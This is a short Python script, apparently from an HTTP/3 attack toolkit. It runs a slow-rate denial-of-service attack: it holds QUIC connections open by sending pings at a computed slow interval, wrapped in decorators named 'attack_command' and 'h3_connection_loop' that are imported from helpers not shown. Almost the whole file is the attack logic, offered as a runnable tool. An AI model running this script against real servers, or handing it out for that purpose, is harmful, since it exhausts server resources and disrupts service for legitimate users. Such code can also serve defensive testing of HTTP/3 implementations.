import asyncio
import logging
from aioquic_http3_client import HttpClient
from utils import attack_command, calculate_slowrate_wait_time, h3_connection_loop

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(name)s:%(message)s', datefmt='%Y-%m-%dT%H:%M:%S')



@attack_command()
@h3_connection_loop()
async def main(addr, con: HttpClient, *args, **kwargs):
    while True:
        await asyncio.sleep(calculate_slowrate_wait_time(con._quic))
        logging.info('Sending ping')
        await con.ping()


if __name__ == '__main__':
    main()
